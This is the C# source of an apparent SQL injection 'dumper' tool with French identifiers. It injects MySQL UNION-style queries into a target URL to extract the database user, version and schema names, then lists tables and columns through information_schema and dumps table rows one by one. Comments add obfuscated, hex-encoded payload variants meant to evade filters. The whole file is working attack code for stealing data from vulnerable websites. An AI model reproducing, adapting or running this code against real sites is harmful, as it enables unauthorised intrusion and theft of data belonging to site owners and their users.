using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SQl_SCanner
{
    class Sqli_dumper
    {
        private MainForm form_principale = GlobalVar.form;

        private const string separateur = "!~!";
        private const string s_separateur = "3!P";
        private const string var_n = "[t]";
        private chaine ch = new chaine();
        private string _url_point;

        internal bool controlleur(string url)
        {
            _url_point = url;
            if(setInfos())
            {
                return true;
            }
            else { return false; }
        }
        public bool setInfos()
        {
            HttpRequete hr = new HttpRequete();
            Outils oo = new Outils();
            string url_g = _url_point.Replace(var_n, "concat(" + ch.getHex(separateur) + ",concat(user()," + ch.getHex(s_separateur) + ",version()," + ch.getHex(s_separateur) + ",database())," + ch.getHex(separateur) + ")");
            string page = hr.get(url_g);
            if (page.Contains(separateur))
            {
                string[] rslt = ch.extSubResult(s_separateur, ch.extResult(separateur, page));
                string ip = oo.avoirip(_url_point.Split('/')[2]);
                setBD(rslt[2]);
                form_principale.groupBox4.Invoke((MethodInvoker)(() =>
                {
                    form_principale.txt_user.Text = rslt[0];
                    form_principale.txt_version.Text = rslt[1];
                    form_principale.txt_ipserveur.Text = ip;
                }));
                return true;
            }
            else
            {
                return false;
            }
        }
        internal void setBD(string bd)
        {
            TreeNode treeBD = new TreeNode(bd);
            form_principale.tree_schema_dmp.Invoke((MethodInvoker)(() =>
            {
                form_principale.tree_schema_dmp.BeginUpdate();
                form_principale.tree_schema_dmp.Nodes.Add(treeBD);
                form_principale.tree_schema_dmp.EndUpdate();
            }));
        }
        internal void setAllBD()
        {
            HttpRequete hr = new HttpRequete();
            int nbr = 0;
            try { nbr = getNombreDB(); }
            catch { }//(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/gRoUp_cOnCaT(/**/sChEmA_NaMe),0x217e21) /**/fRoM information_schema./**/sChEmAtA /**/wHeRe not /**/sChEmA_NaMe=0x696e666f726d6174696f6e5f736368656d61)
            string inj = "(select distinct concat(" + ch.getHex(separateur) + ",group_concat(schema_name)," + ch.getHex(separateur) + ") from information_schema.schemata where not schema_name=" + ch.getHex("information_schema") + ")";
            string url_f = _url_point.Replace(var_n, ch.Encode(inj));
            string page = hr.get(url_f);
            string dbbrut = ch.extResult(separateur, page);

            if (dbbrut != string.Empty)
            {
                if (nbr > 1)
                {
                    string[] basededonnes = dbbrut.Split(new char[] { ',' }, StringSplitOptions.RemoveEmptyEntries);
                    foreach (string bd in basededonnes)
                    {
                        if (!string.IsNullOrEmpty(bd))
                        {
                            string bd_name = ch.regexHtmlScape(bd);
                            TreeNode treeBD = new TreeNode(bd_name);
                            form_principale.tree_schema_dmp.Invoke((MethodInvoker)(() =>
                            {
                                form_principale.tree_schema_dmp.BeginUpdate();
                                form_principale.tree_schema_dmp.Nodes.Add(treeBD);
                                form_principale.tree_schema_dmp.EndUpdate();
                            }));
                        }
                    }
                }
                else
                {
                    TreeNode treeBD = new TreeNode(dbbrut);
                    form_principale.tree_schema_dmp.Invoke((MethodInvoker)(() =>
                    {
                        form_principale.tree_schema_dmp.Nodes.Add(treeBD);
                    }));
                } 
            }
        }
        internal void setTable(string[] chemin_node)
        {
            foreach (string item in chemin_node)
            {
                string[] mrc = item.Split(new char[] { '\\' }, StringSplitOptions.RemoveEmptyEntries);
                int indexDB = -1;
                form_principale.tree_schema_dmp.Invoke((MethodInvoker)(() =>
                {
                    try
                    {
                        indexDB = form_principale.tree_schema_dmp.Nodes.OfType<TreeNode>().FirstOrDefault(node => node.Text.Equals(mrc[0])).Index;
                        form_principale.tree_schema_dmp.Nodes[indexDB].Nodes.Clear();
                    }
                    catch (Exception) { }
                }));
                
                int nbr = 0;
                try { nbr = getNombreTable(mrc[0]); }
                catch { }
                //(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/gRoUp_cOnCaT(/**/tAbLe_nAmE),0x217e21) /**/fRoM information_schema./**/tAbLeS /**/wHeRe /**/tAbLe_sChEmA=0x6d6f64656c73686f5f6462)
                HttpRequete hr = new HttpRequete();
                //Methode 1
                //string inj = "(select distinct concat(" + ch.getHex(separateur) + ",group_concat(table_name)," + ch.getHex(separateur) + ") from information_schema.tables where table_schema=" + ch.getHex(db_name) + ")";
                //Methode 2 //unhex(Hex(cast(group_concat(table_name) as char)))
                string inj = "(select distinct concat(" + ch.getHex(separateur) + ",unhex(Hex(cast(group_concat(table_name) as char)))," + ch.getHex(separateur) + ") from information_schema.tables where table_schema=" + ch.getHex(mrc[0]) + ")";
                string url_f = _url_point.Replace(var_n, (inj));
                string page = hr.get(url_f);
                string tablebrut = ch.extResult(separateur, page);

                string[] tables = tablebrut.Split(new char[] { ',' }, StringSplitOptions.RemoveEmptyEntries);
                foreach (string table in tables)
                {
                    if (!string.IsNullOrEmpty(table))
                    {
                        string table_name = ch.regexHtmlScape(table);
                        try
                        {
                            form_principale.tree_schema_dmp.Invoke((MethodInvoker)(() =>
                            {
                                form_principale.tree_schema_dmp.BeginUpdate();
                                form_principale.tree_schema_dmp.Nodes[indexDB].Nodes.Add(table_name);
                                form_principale.tree_schema_dmp.Nodes[indexDB].Expand();
                                form_principale.tree_schema_dmp.EndUpdate();
                            }));
                        }
                        catch { }
                    }
                }
                
            }
        }
        internal void setColonne(String[] chemin_node)
        {
            foreach (string item in chemin_node)
            {
                string[] mrc = item.Split(new char[] { '\\' }, StringSplitOptions.RemoveEmptyEntries);
                if (mrc.Length > 1)
                {
                    int indexDB = -1;
                    int indexTable = -1;
                    form_principale.tree_schema_dmp.Invoke((MethodInvoker)(() =>
                    {
                        indexDB = form_principale.tree_schema_dmp.Nodes.OfType<TreeNode>().FirstOrDefault(node => node.Text.Equals(mrc[0])).Index;
                        indexTable = form_principale.tree_schema_dmp.Nodes[indexDB].Nodes.OfType<TreeNode>().FirstOrDefault(node => node.Text.Equals(mrc[1])).Index;
                        form_principale.tree_schema_dmp.Nodes[indexDB].Nodes[indexTable].Nodes.Clear();
                    }));
                    

                    int nbr = 0;
                    try { nbr = getNombreColonne(mrc[0], mrc[1]); }
                    catch { }
                    HttpRequete hr = new HttpRequete();
                    //Methode 0
                    //string inj = "(select distinct concat(" + ch.getHex(separateur) + ",group_concat(column_name)," + ch.getHex(separateur) + ") from information_schema.columns where table_schema=" + ch.getHex(db_name) + " and table_name=" + ch.getHex(table_name) + ")";
                    //Methode 1 //unhex(Hex(cast(group_concat(table_name) as char)))
                    string inj = "(select distinct concat(" + ch.getHex(separateur) + ",unhex(Hex(cast(group_concat(column_name) as char)))," + ch.getHex(separateur) + ") from information_schema.columns where table_schema=" + ch.getHex(mrc[0]) + " and table_name=" + ch.getHex(mrc[1]) + ")";
                    string url_f = _url_point.Replace(var_n, ch.Encode(inj));
                    string page = hr.get(url_f);
                    string colonnebrut = ch.extResult(separateur, page);

                    string[] colonnes = colonnebrut.Split(new char[] { ',' }, StringSplitOptions.RemoveEmptyEntries);
                    foreach (string colonne in colonnes)
                    {
                        if (!string.IsNullOrEmpty(colonne))
                        {
                            string colonne_name = ch.regexHtmlScape(colonne);
                            form_principale.tree_schema_dmp.Invoke((MethodInvoker)(() =>
                            {
                                form_principale.tree_schema_dmp.Nodes[indexDB].Nodes[indexTable].Nodes.Add(colonne_name);
                                form_principale.tree_schema_dmp.Nodes[indexDB].Nodes[indexTable].Expand();
                            }));
                        }
                    }
                    
                }
            }
        }
        internal void setDonne(String[] chemin_node)
        {
            foreach (string item in chemin_node)
            {
                string[] mrc = item.Split(new char[] { '\\' }, StringSplitOptions.RemoveEmptyEntries);
                if (mrc.Length > 2)
                {
                    int nbr_row = 0;
                    nbr_row = getNombreDonne(mrc[0], mrc[1]);
                    HttpRequete hr = new HttpRequete();
                    string[] colonne = mrc[2].Split(new string[] { "[-COL]" }, StringSplitOptions.RemoveEmptyEntries);
                    form_principale.dataGridView_dumper.Invoke((MethodInvoker)(() =>
                    {
                        foreach (string element in colonne)
                        {
                            if (element != string.Empty)
                                form_principale.dataGridView_dumper.Columns.Add(element, element);
                        }
                    }));
                    for (int d = 0; d < nbr_row; d++)
                    {
                        string inj = "(select concat(" + BuildQuery(s_separateur, colonne) + ") from " + mrc[0] + "." + mrc[1] + " limit " + d + ",1)";
                        string url_f = _url_point.Replace(var_n, inj);
                        string page = hr.get(url_f);

                        string donnebrut = ch.extResult(separateur, page);
                        string[] resultLignes = donnebrut.Split(new string[] { s_separateur }, StringSplitOptions.None);
                        if (checkAllEmpty(resultLignes))
                        {
                            form_principale.dataGridView_dumper.Invoke((MethodInvoker)(() =>
                            {
                                form_principale.dataGridView_dumper.Rows.Add(resultLignes);
                            }));
                        }
                    }
                }
            }
        }
        private bool checkAllEmpty(string[] array)
        {
            foreach (var item in array)
            {
                if(item != string.Empty)
                    return true;
            }
            return false;
        }
        private string BuildQuery(string s_separator, string[] colonne)
        {
            string query_r = string.Empty;
            int i = 0;
            foreach (string element in colonne)
            {
                if (i == 0)
                {
                    query_r += ch.getHex(separateur) + ",ifnull(" + element + ",char(32)),";
                }
                else if (i == colonne.ToList().Count - 1)
                {
                    query_r += ch.getHex(s_separateur) + ",ifnull(" + element + ",char(32))," + ch.getHex(separateur);
                }
                else
                {
                    query_r += ch.getHex(s_separateur) + ",ifnull(" + element + ",char(32)),";
                }
                i++;
            }
            return query_r;//.Remove(query_retourne.Length - 1);
        }

        private int getNombreDonne(string db_name, string tb_name)
        {  
            HttpRequete hr = new HttpRequete();
            string inj = "(select concat(" + ch.getHex(separateur) + ",count(0)," + ch.getHex(separateur) + ") from " + db_name + "." + tb_name + ")";
            string url_f = _url_point.Replace(var_n, inj);
            string page = hr.get(url_f);
            return Convert.ToInt32(ch.extResult(separateur, page));
        }
        private int getNombreColonne(string db_name, string tb_name)
        {///**/sElEcT /**/cOnCaT(0x217e21,count(0),0x217e21) /**/fRoM information_schema./**/sChEmAtA /**/wHeRe not /**/sChEmA_NaMe=0x696e666f726d6174696f6e5f736368656d61)
            HttpRequete hr = new HttpRequete();
            string inj = "(select concat(" + ch.getHex(separateur) + ",count(0)," + ch.getHex(separateur) + ") from information_schema.sChEmAtA where not sChEmA_NaMe=" + ch.getHex("information_schema") + ")";
            string url_f = _url_point.Replace(var_n, inj);
            string page = hr.get(url_f);
            return Convert.ToInt32(ch.extResult(separateur, page));
        }
        private int getNombreTable(string db_name)
        {
            HttpRequete hr = new HttpRequete();
            string inj = "(select concat(" + ch.getHex(separateur) + ",count(0)," + ch.getHex(separateur) + ") from information_schema.tables where table_schema=" + ch.getHex(db_name) + ")";
            string url_f = _url_point.Replace(var_n, inj);
            string page = hr.get(url_f);
            return Convert.ToInt32(ch.extResult(separateur, page));
        }
        private int getNombreDB()
        {
            HttpRequete hr = new HttpRequete();
            string inj = "(select concat(" + ch.getHex(separateur) + ",count(0)," + ch.getHex(separateur) + ") from information_schema.schemata where not schema_name=" + ch.getHex("information_schema") + ")";
            string url_f = _url_point.Replace(var_n, inj);
            string page = hr.get(url_f);
            return Convert.ToInt32(ch.extResult(separateur, page));
        }
    }
}
